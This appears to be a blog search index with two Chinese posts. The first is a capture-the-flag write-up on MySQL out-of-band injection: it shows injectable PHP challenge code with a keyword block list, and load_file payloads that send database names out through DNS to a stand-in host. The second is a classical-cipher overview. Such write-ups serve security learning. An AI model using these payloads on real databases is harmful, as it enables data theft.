<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[OOB注入]]></title>
      <url>/2017/11/14/MySQL%20OOB%E6%B3%A8%E5%85%A5/</url>
      <content type="html"><![CDATA[<h1 id="MYSQL-OOB-带外注入"><a href="#MYSQL-OOB-带外注入" class="headerlink" title="MYSQL OOB(带外注入)"></a>MYSQL OOB(带外注入)</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这篇文章起于2017hctf中的一道注入题，第一次遇见但确实比较有意思，所以记录下来。<br>原题是一个简单的页面，提示网站的数据库还没有完成，但是页面显示是连接到sql server数据库的。通过目录扫描获得网站部分源码的zip文件。<br><a id="more"></a>源码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"><span class="built_in">echo</span> <span class="string">"Bob received a mission to write a login system on someone else's server, and he he only finished half of the work&lt;br /&gt;"</span>;</div><div class="line"><span class="built_in">echo</span> <span class="string">"flag is hctf&#123;what you get&#125;&lt;br /&gt;&lt;br /&gt;"</span>;</div><div class="line">error_reporting(E_ALL^E_NOTICE^E_WARNING);</div><div class="line"></div><div class="line">try &#123;</div><div class="line">   <span class="variable">$conn</span> = new PDO( <span class="string">"sqlsrv:Server=*****;Database=not_here"</span>,<span class="string">"oob"</span>, <span class="string">""</span>); </div><div class="line">&#125;</div><div class="line"></div><div class="line">catch( PDOException <span class="variable">$e</span> ) &#123;</div><div class="line">   die( <span class="string">"Error connecting to SQL Server"</span>.<span class="variable">$e</span>-&gt;getMessage() ); </div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">#echo "Connected to MySQL&lt;br /&gt;";</span></div><div class="line"><span class="built_in">echo</span> <span class="string">"Connected to SQL Server&lt;br /&gt;"</span>;</div><div class="line"></div><div class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">'id'</span>];</div><div class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/EXEC|xp_cmdshell|sp_configure|xp_reg(.*)|CREATE|DROP|declare|insert|into|outfile|dumpfile|sleep|wait|benchmark/i'</span>, <span class="variable">$id</span>)) &#123;</div><div class="line">	die(<span class="string">'NoNoNo'</span>);</div><div class="line">&#125;</div><div class="line"><span class="variable">$query</span> = <span class="string">"select message from not_here_too where id = <span class="variable">$id</span>"</span>; //link server: On  linkname:mysql</div><div class="line"></div><div class="line"><span class="variable">$stmt</span> = <span class="variable">$conn</span>-&gt;query( <span class="variable">$query</span> ); </div><div class="line"><span class="keyword">while</span> ( @<span class="variable">$row</span> = <span class="variable">$stmt</span>-&gt;fetch( PDO::FETCH_ASSOC ) )&#123;</div><div class="line">	//TO DO: ...</div><div class="line">	//It<span class="string">'s time to sleep...</span></div><div class="line">&#125;</div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>从源码中看出其过滤了sql server 的命令函数，并且提示<code>link server: On</code>,<code>linkname:mysql</code>,一搜才发现原来可以在sql server中可以设置连接到mysql数据库，从mysql中获取数据。具体连接语句<code>id=1 select * from openquery(mysql,&#39;select * from config&#39;);</code>就可以连接到本地或者远程的mysql数据库。</p>
<h2 id="什么是带外注入"><a href="#什么是带外注入" class="headerlink" title="什么是带外注入"></a>什么是带外注入</h2><p>OOB攻击是通过外部通道，例如<em>http(s)请求</em>，DNS解析，文件系统和电子邮件系统等服务通道将数据库中的信息带出。而一般的sql注入我们是直接在数据库中直接获取数据库信息。</p>
<p>##利用条件<br>MySQL中有一个名为secure_file_priv的全局系统变量。这个变量用于限制数据导入和导出操作造成的影响，例如由LOAD DATA 和SELECT…INTO OUTFILE语句和LOAD_FILE()函数执行的操作。</p>
<ul>
<li>如果变量设置为目录的名称，则服务器会将导入和导出操作限制在跟这个目录中一起使用。这个目录必须存在，服务器不会自己创建它。</li>
<li>如果变量为空，则不会产生影响，引起不安全的配置。</li>
<li>如果变量设置为NULL，那么服务器就会禁用导入和导出操作。这个值从MySQL 5.5.53版本开始允许。</li>
</ul>
<p>在MySQL 5.5.53之前，此变量默认为空，因此我们就可以使用这些函数。但是在5.5.53之后的版本中，NULL值会禁用这些功能。我们可使用其中的一种方法来检查这个变量的值。Secure_file_priv是一个全局变量，它是一个只读变量，你不能在运行时改变它。也就是说如果此种注入比较依赖版本。</p>
<h2 id="使用DNS解析提取数据"><a href="#使用DNS解析提取数据" class="headerlink" title="使用DNS解析提取数据"></a>使用DNS解析提取数据</h2><p>在mysql中会对查询语句中的ip和网址尝试DNS解析。例如：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="keyword">concat</span>(‘\\\\’,<span class="keyword">database</span>()’yoursite.com\\a.txt’));</div><div class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="keyword">concat</span>(<span class="number">0x5c5c5c5c</span>,<span class="keyword">database</span>(),<span class="number">0x796F7572736974652E636F6D5C5C612E747874</span>));</div></pre></td></tr></table></figure></p>
<p>为了直观演示我们在本地输入上面第二条payload</p>
<p><img src="http://ourd90bac.bkt.clouddn.com/OOB4.jpg" alt=""><br>然后我们抓包看Mysql发出的DNS查询数据<br><img src="http://ourd90bac.bkt.clouddn.com/OOB5.jpg" alt=""><br>我们可以看到mysql直接将我们的查询语句verson()返回的数据user发送给了DNS服务器。<br>然后我们在我们的DNS服务器上（这里网上有现成的<a href="http://dnsbin.zhack.ca/）就可以看到mysql发过来的数据,例如我查询的是数据库的版本号。" target="_blank" rel="external">http://dnsbin.zhack.ca/）就可以看到mysql发过来的数据,例如我查询的是数据库的版本号。</a><br><img src="http://ourd90bac.bkt.clouddn.com/OOB3.jpg" alt=""></p>
<p>就是这样，我们就通过DNS通道，完成了和普通mysql注入同样的数据查询效果。</p>
<p>回到原题，利用这个思路，我们就可以很清楚地爆出题目的数据，原题数据如下，这里就只贴出数据库的名字，后续的用一般手法注入就行了：<br><img src="http://ourd90bac.bkt.clouddn.com/OOB.jpg" alt=""></p>
]]></content>
      
        
        <tags>
            
            <tag> CTF </tag>
            
            <tag> OOB </tag>
            
            <tag> 注入 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[密码学总结系列]]></title>
      <url>/2017/11/13/%E5%AF%86%E7%A0%81%E5%AD%A6%E6%80%BB%E7%BB%93%E7%B3%BB%E5%88%97/</url>
      <content type="html"><![CDATA[<h1 id="密码学总结（一）-古典密码汇总"><a href="#密码学总结（一）-古典密码汇总" class="headerlink" title="密码学总结（一） 古典密码汇总"></a>密码学总结（一） 古典密码汇总</h1><blockquote>
<p>古典密码基本上都是替代密码，细微的差别就只是在替代规则上的不同。较简单的就是固定移位的位数来确定加密的秘钥，另外的一种就是自己约定的无规律的秘钥。<br>移位加密–&gt;单字母替换无规律秘钥加密–&gt;多字母替换秘钥加密</p>
</blockquote>
<a id="more"></a>
<h2 id="Atbash密码"><a href="#Atbash密码" class="headerlink" title="Atbash密码"></a>Atbash密码</h2><p>Atbash密码是一种替代密码，其中一个特定的密钥在字母的字母颠倒。也就是说，所有’A’被替换为’Z’，所有’B’被替换为’Y’，等等。它最初用于希伯来语字母表，但可用于任何字母表。它的安全性很差，只要知道是替代密码就可以甚至用其他替代密码的破解方式破解。</p>
<h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ABCDEFGHIJKLMNOPQRSTUVWXYZ</div><div class="line">ZYXWVUTSRQPONMLKJIHGFEDCBA</div></pre></td></tr></table></figure>
<p>按照表上的对应关系，直接替换就可以了。</p>
<h2 id="Rot13密码"><a href="#Rot13密码" class="headerlink" title="Rot13密码"></a>Rot13密码</h2><p>ROT13密码是具有特定密钥的替代密码，其中字母的字母被偏移13个位置。也就是说，所有’A’被替换为’N’，全部’B’被替换为’O’等等。它也可以被认为是一个13的变化凯撒密码。</p>
<h3 id="算法-1"><a href="#算法-1" class="headerlink" title="算法"></a>算法</h3><p>和Atbash一样仅为移位更换<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ABCDEFGHIJKLMNOPQRSTUVWXYZ</div><div class="line">NOPQRSTUVWXYZABCDEFGHIJKLM</div></pre></td></tr></table></figure></p>
<p>##凯撒密码<br>凯撒密码是最早已知和最简单的密码之一。它是一种替代密码，其中明文中的每个字母都在字母表中“移动”了一定数量的位置。例如，如果移位1，则A将被B替换，B将变成C，依此类推。</p>
<h3 id="算法-2"><a href="#算法-2" class="headerlink" title="算法"></a>算法</h3><p>首先我们把所有的字符翻译成数字，’a’= 0，’b’= 1，’c’= 2，…，’z’= 25。我们现在可以代表凯撒密码加密函数e（x），其中x是我们正在加密的字符，</p>
<p>##仿射密码<br>该密码是少比一个安全的替代密码。密码的主要弱点来自这样一个事实：如果密码分析者能够通过频率分析，暴力破解，猜测或者其他方法发现两个密文字符的明文，那么通过求解一个联立方程可以得到密钥。<br>拥有两个秘钥<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">加密 c = (key1*p+key2) (mod m)</div><div class="line">解密 p = key1~1（c-key2）</div></pre></td></tr></table></figure></p>
<h2 id="培根密码"><a href="#培根密码" class="headerlink" title="培根密码"></a>培根密码</h2><p>培根的密码是以其发明者弗朗西斯·培根爵士的名字命名的。培根的密码是一个替换密码，其中每个字母被替换为5个字符的序列。在原始密码中，这些是“A”和“B”的序列，例如字母“D”被“aaabb”替换，字母“O”被“abbab”替换。</p>
<h3 id="算法-3"><a href="#算法-3" class="headerlink" title="算法"></a>算法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">A = aaaaa I / J = abaaa R = baaaa</div><div class="line">B = aaaab K = abaab S = baaab</div><div class="line">C = aaaba L = ababa T = baaba</div><div class="line">D = aaabb M = ababb U / V = baabb</div><div class="line">E = aabaa N = abbaa W = babaa</div><div class="line">F = aabab O = abbab X = babab</div><div class="line">G = aabba P = abbba Y = babba</div><div class="line">H = aabbb Q = abbbb Z = babbb</div></pre></td></tr></table></figure>
<blockquote>
<p>培根密码是一种替代密码，这里就不把替换密码单独提出来了，替换密码其实就是将上面提到的移位规律打乱，生成只有自己人知道的对应秘钥。其与移位密码有共同之处，或者说是其的强化版。但是相比于简单的凯撒和仿射密码，其秘钥的可能性更多。在破解秘钥难度上相比较后两者要难得多，但是我们可以利用爬山算法进行猜解，解出经过预估秘钥解密后最符合英文语句（明文）的可能性。详见网站<a href="https://quipqiup.com/" target="_blank" rel="external">https://quipqiup.com/</a></p>
</blockquote>
<h2 id="Polybius广场密码"><a href="#Polybius广场密码" class="headerlink" title="Polybius广场密码"></a>Polybius广场密码</h2><p>Polybius Square与简单替换密码基本相同，只是每个明文字符都被加密为2个密文字符。如果密文中只有5或6个不同的字符，通常可以检测到。</p>
<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">   A B C D E</div><div class="line">   - - - - -</div><div class="line">A| p h q g m</div><div class="line">B| e a y l n</div><div class="line">C| o f d x k</div><div class="line">D| r c v s z</div><div class="line">E| w b u t i</div></pre></td></tr></table></figure>
<p>框中的字母就是秘钥，边框外的是加密后会出现的字母。例如我们对字母’a’进行加密就是在秘钥矩阵中找到a，然后找到对应框外的密文’BB’</p>
<h2 id="列转换密码"><a href="#列转换密码" class="headerlink" title="列转换密码"></a>列转换密码</h2><p>列转换密码是一个相当简单，易于实现的密码。它是一个转置密码，它遵循一个简单的规则来混合明文中的字符来形成密文。</p>
<p>虽然它本身很弱，但可以与其他密码相结合，比如替代密码，它们的组合可能比其自身的密码更难以破解。该 adfgvx密码使用柱状换位，大大提高了其安全性。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">G E R M A N</div><div class="line">- - - - - -</div><div class="line">d e f e n d</div><div class="line">t h e e a s</div><div class="line">t w a l l o</div><div class="line">f t h e c a</div><div class="line">s t l e x x</div></pre></td></tr></table></figure>
<p>横线上是关键字，将要加密的明文进行填充，不足的地方用特定的字符填充，如此处使用的是x（可以更换成自己约定好的字符）来填充明文填进后的不足的两位。<br>然后将单词打乱<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">AEGMNR</div><div class="line">------</div><div class="line">nededf</div><div class="line">ahtese</div><div class="line">lwtloa</div><div class="line">ctfeah</div><div class="line">xtsexl</div></pre></td></tr></table></figure></p>
<p>最后按照列输出密文。</p>
<h2 id="自动秘钥密码"><a href="#自动秘钥密码" class="headerlink" title="自动秘钥密码"></a>自动秘钥密码</h2><p>自动密钥密码是一种多字母替代密码。</p>
<h3 id="算法-4"><a href="#算法-4" class="headerlink" title="算法"></a>算法</h3><p>自动密钥密码的“关键”是一个关键词。例如’FORTIFICATION’<br>自动密钥密码使用下面的表格（’tabula recta’）来加密明文：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">    A B C D E F G H I J K L M N O P Q R S T U V W X Y Z</div><div class="line">    ---------------------------------------------------</div><div class="line">A   A B C D E F G H I J K L M N O P Q R S T U V W X Y Z</div><div class="line">B   B C D E F G H I J K L M N O P Q R S T U V W X Y Z A</div><div class="line">C   C D E F G H I J K L M N O P Q R S T U V W X Y Z A B</div><div class="line">D   D E F G H I J K L M N O P Q R S T U V W X Y Z A B C</div><div class="line">E   E F G H I J K L M N O P Q R S T U V W X Y Z A B C D</div><div class="line">F   F G H I J K L M N O P Q R S T U V W X Y Z A B C D E</div><div class="line">G   G H I J K L M N O P Q R S T U V W X Y Z A B C D E F</div><div class="line">H   H I J K L M N O P Q R S T U V W X Y Z A B C D E F G</div><div class="line">I   I J K L M N O P Q R S T U V W X Y Z A B C D E F G H</div><div class="line">J   J K L M N O P Q R S T U V W X Y Z A B C D E F G H I</div><div class="line">K   K L M N O P Q R S T U V W X Y Z A B C D E F G H I J</div><div class="line">L   L M N O P Q R S T U V W X Y Z A B C D E F G H I J K</div><div class="line">M   M N O P Q R S T U V W X Y Z A B C D E F G H I J K L</div><div class="line">N   N O P Q R S T U V W X Y Z A B C D E F G H I J K L M</div><div class="line">O   O P Q R S T U V W X Y Z A B C D E F G H I J K L M N</div><div class="line">P   P Q R S T U V W X Y Z A B C D E F G H I J K L M N O</div><div class="line">Q   Q R S T U V W X Y Z A B C D E F G H I J K L M N O P</div><div class="line">R   R S T U V W X Y Z A B C D E F G H I J K L M N O P Q</div><div class="line">S   S T U V W X Y Z A B C D E F G H I J K L M N O P Q R</div><div class="line">T   T U V W X Y Z A B C D E F G H I J K L M N O P Q R S</div><div class="line">U   U V W X Y Z A B C D E F G H I J K L M N O P Q R S T</div><div class="line">V   V W X Y Z A B C D E F G H I J K L M N O P Q R S T U</div><div class="line">W   W X Y Z A B C D E F G H I J K L M N O P Q R S T U V</div><div class="line">X   X Y Z A B C D E F G H I J K L M N O P Q R S T U V W</div><div class="line">Y   Y Z A B C D E F G H I J K L M N O P Q R S T U V W X</div><div class="line">Z   Z A B C D E F G H I J K L M N O P Q R S T U V W X Y</div></pre></td></tr></table></figure></p>
<p>将要加密的明文放在关键字的放在关键字的下方，和关键字的字母一一对应，如果关键字的位数不够，那么就从明文的开头截取字母补充进关键字，如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">FORTIFICATIONDEFENDTHEEASTWA</div><div class="line">DEFENDTHEEASTWALLOFTHECASTLE</div></pre></td></tr></table></figure></p>
<p>上面第一行是关键字和明文补充上来生成的秘钥，下方为明文。<br>加密过程：现在我们把我们要编码的字母’D’，并在画面的第一列找到它。然后，我们沿着画面的“D”行移动，直到我们到达顶部具有“F”的列（“F”是第一个“D”的关键字字母），交集就是我们的密文字符， ‘I’</p>
<h2 id="博福特密码"><a href="#博福特密码" class="headerlink" title="博福特密码"></a>博福特密码</h2><p>这个密码是在上面的自动秘钥密码的基础上微创新而来的（古人是真的烦，这种创新都可以成为一种新密码，也是无语了）。<br>其所采用的加密图形和上面一样。</p>
<h3 id="算法-5"><a href="#算法-5" class="headerlink" title="算法"></a>算法</h3><p>在秘钥生成上，博福特密码所采用的依旧是关键字，不过对应的不足位是由关键字补充的，这和上面的自动秘钥密码有很大的区别，个人觉得秘钥的随机性有所减弱，但是依旧有效（即使这种加密并不安全）。<br>在密文生成上，和自动秘钥密码刚好相反。它是从最上面的一行找出要加密的明文字母然后再从这一列读取对应关键字字母的密文。例如：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">关键字秘钥：FORTIFICATIONFORTIFICATIONFO</div><div class="line">明文：     DEFENDTHEEASTWALLOFTHECASTLE</div><div class="line">密文：     CKMPVCPVWPIWUJOGIUAPVWRIWUUK</div></pre></td></tr></table></figure></p>
<h2 id="Porta密码"><a href="#Porta密码" class="headerlink" title="Porta密码"></a>Porta密码</h2><p>一种多字母替代密码。</p>
<h3 id="算法-6"><a href="#算法-6" class="headerlink" title="算法"></a>算法</h3><p>和上面的博福特加密方式大同小异，依旧采用关键字座位加密的秘钥，但是在加密矩阵的密文字符使用更加隐晦的排列规律。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">Keys| a b c d e f g h i j k l m n o p q r s t u v w x y z</div><div class="line">---------------------------------------------------------</div><div class="line">A,B | n o p q r s t u v w x y z a b c d e f g h i j k l m</div><div class="line">C,D | o p q r s t u v w x y z n m a b c d e f g h i j k l</div><div class="line">E,F | p q r s t u v w x y z n o l m a b c d e f g h i j k </div><div class="line">G,H | q r s t u v w x y z n o p k l m a b c d e f g h i j</div><div class="line">I,J | r s t u v w x y z n o p q j k l m a b c d e f g h i</div><div class="line">K,L | s t u v w x y z n o p q r i j k l m a b c d e f g h</div><div class="line">M,N | t u v w x y z n o p q r s h i j k l m a b c d e f g</div><div class="line">O,P | u v w x y z n o p q r s t g h i j k l m a b c d e f</div><div class="line">Q,R | v w x y z n o p q r s t u f g h i j k l m a b c d e</div><div class="line">S,T | w x y z n o p q r s t u v e f g h i j k l m a b c d</div><div class="line">U,V | x y z n o p q r s t u v w d e f g h i j k l m a b c</div><div class="line">W,X | y z n o p q r s t u v w x c d e f g h i j k l m a b</div><div class="line">Y,Z | z n o p q r s t u v w x y b c d e f g h i j k l m a</div></pre></td></tr></table></figure></p>
<p>在加密过程中是以关键字去寻找明文所对应的字母加密，不再是像上面那样是用明文去匹配关键字的对应字母进行加密<br>例如：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">关键字：FORTIFICATIONFORTIFICATIONFO</div><div class="line">明文  ：DEFENDTHEEASTWALLOFTHECASTLE</div><div class="line">密文：  synnjscvrnrlahutukucvryrlany</div></pre></td></tr></table></figure></p>
<p>加密过程：我们取第一个关键字母“F”，并在画面的第一列（包含两个字母的关键列）上找到它。然后，我们沿着画面的’F’行移动，直到到达顶部带有’D’的列（’D’是第一个明文字母），交集就是我们的密文字符’S’。所有字符都重复相同的过程。</p>
<h2 id="运行秘钥加密"><a href="#运行秘钥加密" class="headerlink" title="运行秘钥加密"></a>运行秘钥加密</h2><p>这种加密方式也是属于在自动秘钥加密基础上的改进加密方式。其在关键字的选择上不在选择短的关键单词组，而是截取一段完整的话作为对应的关键字。加密使用的矩阵和自动秘钥使用的矩阵一模一样。</p>
<p>算法：<br>参照自动米要加密，这里就不重复造轮子了。</p>
<h2 id="同调替换密码"><a href="#同调替换密码" class="headerlink" title="同调替换密码"></a>同调替换密码</h2><p>同音替换密码是一种替代密码，其中单个明文字母可以被几个不同的密文字母中的任何一个替代。它们通常比标准的替代密码更难破解。与其他替换密码所不同的就是其单个字母可以有多种可供替换的字母，这就让其安全性有很大提高，非常难被破解。</p>
<h3 id="算法-7"><a href="#算法-7" class="headerlink" title="算法"></a>算法</h3><p>例如：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">明文中的字母：A B C D E F G H I J K L M N O P Q R S T U V W X Y Z</div><div class="line">			-----------------------------------------------------</div><div class="line">可供替换密文：D X S F Z E H C V I T P G A Q L K J R U O W M Y B N</div><div class="line">可供替换密文  9       7       3         5 0       4 6            </div><div class="line">				    2                                          </div><div class="line">可供替换密文			1</div></pre></td></tr></table></figure></p>
<h2 id="四方密码"><a href="#四方密码" class="headerlink" title="四方密码"></a>四方密码</h2><p>使用5x5排列的矩阵，每个矩阵包含25个字母，但是有26个英文字母，所有会将其中两个字母合并成为一个字母表示（由于q和j在英文中较少见，所以默认q可以代表i和它本身）。一般情况下左上角和右下角是明文的字母参照表，右上角和左下角是秘钥的字母参照表。<br>秘钥可以是任意的，两个秘钥矩阵可以是不一样的。</p>
<h3 id="算法-8"><a href="#算法-8" class="headerlink" title="算法"></a>算法</h3><p>先将要加密的明文英文字符串每两个分为一组。例如：<code>I LOVE YOU</code>—&gt;<code>IL OV EY OU</code>如果出现单个字符就使用x来补充长度。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">a b c d e   Z G P T F</div><div class="line">f g h i k   O I H M U</div><div class="line">l m n o p   W D R C N</div><div class="line">q r s t u   Y K E Q A</div><div class="line">v w x y z   X V S B L</div><div class="line"> </div><div class="line">M F N B D   a b c d e</div><div class="line">C R H S A   f g h i k</div><div class="line">X Y O G V   l m n o p</div><div class="line">I T U E W   q r s t u</div><div class="line">L Q Z K P   v w x y z</div></pre></td></tr></table></figure></p>
<p><img src="http://ourd90bac.bkt.clouddn.com/sifang.jpg" alt=""><br>先在明文矩阵中找到明文对应的字母’i’和’l’然后在秘钥矩阵中找到对应的密文，密文的确定是以能和明文的两个点构成矩形来确定的。例如这里我们找到仅有的’o’和’g’两个点能满足条件，所以il对应的密文就是og。以此类推就行了</p>
<h2 id="Playfair密码"><a href="#Playfair密码" class="headerlink" title="Playfair密码"></a>Playfair密码</h2><p>Playfair算法基于一个5*5的字母矩阵，该矩阵使用一个关键词构造，方法是按从左到右、从上到下顺序，填入关键词的字母(去除重复字母)后，将字母表其作余字母填入。<br><img src="http://ourd90bac.bkt.clouddn.com/pa.jpg" alt=""></p>
<h3 id="算法-9"><a href="#算法-9" class="headerlink" title="算法"></a>算法</h3><p>1.若明文出现相同字母在一组，则在重复的明文字母中插入一个填充字母(eg:z)进行分隔后重新分组(eg: balloon被重新分组为ba lz lo on)<br>2.若分组到最后一组时只有一个字母，则补充字母z<br>3.若明文字母在矩阵中同行，则循环取其右边下一个字母为密文(矩阵最右边的下一个是最左边的第一个)(eg: ar被加密为RM)<br>4.若明文字母在矩阵中同列，则循环取其下边下一个字母为密文(矩阵最下边的下一个是最上边的第一个)(eg: mu被加密为CM)<br>5.若明文字母在矩阵中不同行不同列，则取其同行且与同组另一字母同列的字母为密文(eg: hs被加密为BP，ea被加密为IM或JM)</p>
<p>例如：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">明文：we are discovered save yourself</div><div class="line">密文：UG RM KC SX HM UF MK BT OX GC MV AT LU KV</div></pre></td></tr></table></figure></p>
<h2 id="ADFGVX密码"><a href="#ADFGVX密码" class="headerlink" title="ADFGVX密码"></a>ADFGVX密码</h2><p>一种德军在一战中基于广场密码开发的密码，有点类似列转换密码和广场密码的整合。<br>其由两个关键的秘钥，一是秘钥矩阵，而是关键字秘钥。<br>例如：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">    A D F G V X</div><div class="line">  --------------</div><div class="line">A | p h 0 q g 6</div><div class="line">D | 4 m e a 1 y</div><div class="line">F | l 2 n o f d</div><div class="line">G | x k r 3 c v</div><div class="line">V | s 5 z w 7 b</div><div class="line">X | j 9 u t i 8</div></pre></td></tr></table></figure></p>
<p>关键字:<code>G E R M A N</code></p>
<h3 id="算法-10"><a href="#算法-10" class="headerlink" title="算法"></a>算法</h3><p>矩阵内为秘钥矩阵，里面的字母对应明文的字符，外面的大写是第一次加密出来的密文字母。</p>
<p>例如：<code>ATTACK</code>—&gt;<code>DG XG XG DG GV GD</code></p>
<p>然后使用关键字秘钥进行二次加密。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">G E R M A N</div><div class="line">------------</div><div class="line">D G X G X G</div><div class="line">D G G V G D</div></pre></td></tr></table></figure></p>
<p>然后按照字母顺序进行排列二次加密<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">A E G M N R</div><div class="line">-----------</div><div class="line">X G D G G X</div><div class="line">G G D V D G</div></pre></td></tr></table></figure></p>
<p>然后按照列读取最终的密文<br><code>XG GG DD GV GD XG</code></p>
<blockquote>
<p>与ADFGVX密码类似的是ADFGX密码，其工作方式和前者一模一样，差别在于后者是5x5的加密矩阵，且不能对J进行加密。</p>
</blockquote>
<h2 id="双岐密码"><a href="#双岐密码" class="headerlink" title="双岐密码"></a>双岐密码</h2><p>Bifid是将Polybius平方与转置相结合的密码，并使用分割实现扩散。并且这是一个完全没有军事和政府背景的密码。</p>
<p>秘钥的依旧是矩阵秘钥，但是通过秘钥转换后还是需要处理转换<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">   1 2 3 4 5</div><div class="line">  -----------</div><div class="line">1| p h q g m</div><div class="line">2| e a y l n</div><div class="line">3| o f d x k</div><div class="line">4| r c v s z</div><div class="line">5| w b u t i</div></pre></td></tr></table></figure></p>
<h3 id="算法-11"><a href="#算法-11" class="headerlink" title="算法"></a>算法</h3><p>在加密明文时，每个字母都会被左侧和上方的数字替换。然后如步骤1（如下）所示将这些文件重叠在一起。例如，’d’在关键方块的第3行第3列，所以3写在第一行，第3行写在第二行。这是为所有明文信件完成的。步骤2：然后把这些数字组合成一定大小的块（这称为周期，并形成密钥的一部分）。在这个例子中，周期是5.然后从左到右读取这些组。步骤3显示从左到右阅读组后的新数字序列，首先是组的最上一行，然后是最后一行。<br><img src="http://ourd90bac.bkt.clouddn.com/bli.jpg" alt=""></p>
